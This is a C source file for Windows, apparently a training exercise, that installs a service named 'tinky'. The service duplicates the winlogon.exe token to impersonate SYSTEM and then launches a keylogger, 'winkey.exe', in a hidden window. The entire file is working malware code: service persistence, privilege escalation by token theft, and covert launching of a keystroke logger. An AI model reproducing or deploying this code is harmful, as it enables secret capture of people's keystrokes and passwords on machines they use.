#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// ─── Defines ────────────────────────────────────────────────────────────────

#define SERVICE_NAME    "tinky"
#define KEYLOGGER_NAME  "winkey.exe"

// ─── Globals ────────────────────────────────────────────────────────────────

SERVICE_STATUS_HANDLE   g_status_handle     = NULL;
SERVICE_STATUS          g_status            = {0};
HANDLE                  g_keylogger_process = NULL;

// ─── Forward declarations ────────────────────────────────────────────────────

void install_service(void);
void start_service(void);
void stop_service(void);
void delete_service(void);
VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceCtrlHandler(DWORD control);
BOOL impersonate_system(void);
void launch_keylogger(void);

// ─── main ───────────────────────────────────────────────────────────────────

int main(int argc, char *argv[])
{
    if (argc == 1)
    {
        SERVICE_TABLE_ENTRY table[] = {
            { SERVICE_NAME, ServiceMain },
            { NULL, NULL }
        };
        StartServiceCtrlDispatcherA(table);
        return 0;
    }

    if      (strcmp(argv[1], "install") == 0) install_service();
    else if (strcmp(argv[1], "start")   == 0) start_service();
    else if (strcmp(argv[1], "stop")    == 0) stop_service();
    else if (strcmp(argv[1], "delete")  == 0) delete_service();
    else
        printf("Usage: svc.exe [install|start|stop|delete]\n");

    return 0;
}

// ─── SCM client functions ────────────────────────────────────────────────────

void install_service(void)
{
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm)
    {
        printf("OpenSCManager failed: %lu\n", GetLastError());
        return;
    }

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    SC_HANDLE svc = CreateServiceA(
        scm,
        SERVICE_NAME,
        SERVICE_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        path,
        NULL, NULL, NULL, NULL, NULL
    );

    if (!svc)
        printf("CreateService failed: %lu\n", GetLastError());
    else
    {
        printf("Service {%s} installed successfully.\n", SERVICE_NAME);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
}

void start_service(void)
{
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm)
    {
        printf("OpenSCManager failed: %lu\n", GetLastError());
        return;
    }

    SC_HANDLE svc = OpenServiceA(scm, SERVICE_NAME, SERVICE_ALL_ACCESS);
    if (!svc)
    {
        printf("OpenService failed: %lu\n", GetLastError());
        CloseServiceHandle(scm);
        return;
    }

    if (!StartServiceA(svc, 0, NULL))
        printf("StartService failed: %lu\n", GetLastError());
    else
        printf("Service {%s} started successfully.\n", SERVICE_NAME);

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
}

void stop_service(void)
{
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm)
    {
        printf("OpenSCManager failed: %lu\n", GetLastError());
        return;
    }

    SC_HANDLE svc = OpenServiceA(scm, SERVICE_NAME, SERVICE_ALL_ACCESS);
    if (!svc)
    {
        printf("OpenService failed: %lu\n", GetLastError());
        CloseServiceHandle(scm);
        return;
    }

    SERVICE_STATUS status;
    if (!ControlService(svc, SERVICE_CONTROL_STOP, &status))
        printf("ControlService failed: %lu\n", GetLastError());
    else
        printf("Service {%s} stopped successfully.\n", SERVICE_NAME);

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
}

void delete_service(void)
{
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm)
    {
        printf("OpenSCManager failed: %lu\n", GetLastError());
        return;
    }

    SC_HANDLE svc = OpenServiceA(scm, SERVICE_NAME, SERVICE_ALL_ACCESS);
    if (!svc)
    {
        printf("OpenService failed: %lu\n", GetLastError());
        CloseServiceHandle(scm);
        return;
    }

    if (!DeleteService(svc))
        printf("DeleteService failed: %lu\n", GetLastError());
    else
        printf("Service {%s} deleted successfully.\n", SERVICE_NAME);

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
}

// ─── Service server side ─────────────────────────────────────────────────────

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
    g_status_handle = RegisterServiceCtrlHandlerA(SERVICE_NAME, ServiceCtrlHandler);
    if (!g_status_handle)
        return;

    g_status.dwServiceType      = SERVICE_WIN32_OWN_PROCESS;
    g_status.dwCurrentState     = SERVICE_START_PENDING;
    g_status.dwControlsAccepted = 0;
    g_status.dwWin32ExitCode    = NO_ERROR;
    g_status.dwCheckPoint       = 0;
    g_status.dwWaitHint         = 3000;
    SetServiceStatus(g_status_handle, &g_status);

    if (!impersonate_system())
    {
        g_status.dwCurrentState  = SERVICE_STOPPED;
        g_status.dwWin32ExitCode = GetLastError();
        SetServiceStatus(g_status_handle, &g_status);
        return;
    }
    launch_keylogger();

    g_status.dwCurrentState     = SERVICE_RUNNING;
    g_status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_status.dwCheckPoint       = 0;
    g_status.dwWaitHint         = 0;
    SetServiceStatus(g_status_handle, &g_status);

    WaitForSingleObject(g_keylogger_process, INFINITE);

    g_status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_status_handle, &g_status);
}

VOID WINAPI ServiceCtrlHandler(DWORD control)
{
    if (control == SERVICE_CONTROL_STOP)
    {
        g_status.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_status_handle, &g_status);

        if (g_keylogger_process)
        {
            TerminateProcess(g_keylogger_process, 0);
            CloseHandle(g_keylogger_process);
            g_keylogger_process = NULL;
        }

        // Report: stopped
        g_status.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_status_handle, &g_status);
    }
}

// ─── SYSTEM token impersonation ──────────────────────────────────────────────

BOOL impersonate_system(void)
{
    DWORD winlogon_pid = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return FALSE;

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &entry))
    {
        do {
            if (strcmp(entry.szExeFile, "winlogon.exe") == 0)
            {
                winlogon_pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }
    CloseHandle(snapshot);

    if (!winlogon_pid)
        return FALSE;

    HANDLE winlogon_proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogon_pid);
    if (!winlogon_proc)
        return FALSE;

    HANDLE token = NULL;
    if (!OpenProcessToken(winlogon_proc, TOKEN_DUPLICATE, &token))
    {
        CloseHandle(winlogon_proc);
        return FALSE;
    }
    CloseHandle(winlogon_proc);

    HANDLE dup_token = NULL;
    if (!DuplicateTokenEx(
        token,
        TOKEN_ALL_ACCESS,
        NULL,
        SecurityImpersonation,
        TokenPrimary,
        &dup_token))
    {
        CloseHandle(token);
        return FALSE;
    }
    CloseHandle(token);

    // Impersonate SYSTEM
    if (!ImpersonateLoggedOnUser(dup_token))
    {
        CloseHandle(dup_token);
        return FALSE;
    }

    CloseHandle(dup_token);
    return TRUE;
}

// ─── Launch keylogger ────────────────────────────────────────────────────────

void launch_keylogger(void)
{
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char *last_slash = strrchr(path, '\\');
    if (last_slash)
        *(last_slash + 1) = '\0';
    strcat(path, KEYLOGGER_NAME);

    STARTUPINFOA si      = { sizeof(STARTUPINFOA) };
    si.dwFlags           = STARTF_USESHOWWINDOW;
    si.wShowWindow       = SW_HIDE;

    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessA(
        path,
        NULL,
        NULL, NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi))
    {
        return;
    }
    g_keylogger_process = pi.hProcess;
    CloseHandle(pi.hThread);
}
